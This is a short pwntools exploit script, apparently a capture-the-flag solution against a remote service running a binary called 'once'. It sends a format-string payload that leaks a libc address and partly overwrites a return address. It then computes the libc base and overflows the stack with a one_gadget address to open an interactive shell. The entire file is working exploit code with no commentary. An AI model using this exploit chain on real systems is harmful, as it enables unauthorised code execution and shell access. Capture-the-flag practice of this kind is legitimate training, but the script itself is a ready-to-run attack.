from pwn import * 

context(os='linux', log_level = 'debug', arch = 'amd64')



# context.terminal = ['tmux', 'splitw', '-h']
# sh = process('./once')
# gdb.attach(sh)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


sh = remote('182.92.108.71', 30107)
libc = ELF('./libc-2.27.so')


# payload = '%210c%11$hhn%13$p'
payload = '%13$p'.ljust(0x28, 'a') + '\xba'
sh.sendafter('It is your turn: ', payload)

libcbase = int(sh.recv(14), 16) - libc.symbols['__libc_start_main'] - 231
sh.recvuntil('a')
log.success('libcbase: ' + hex(libcbase))
one = [0x4f3d5, 0x4f432, 0x10a41c]
# one = [0x4f2c5, 0x4f322, 0x10a38c]
one_gadget = one[0] + libcbase
payload = 'a' * 0x28 + p64(one_gadget)


sh.sendline(payload)


sh.interactive()
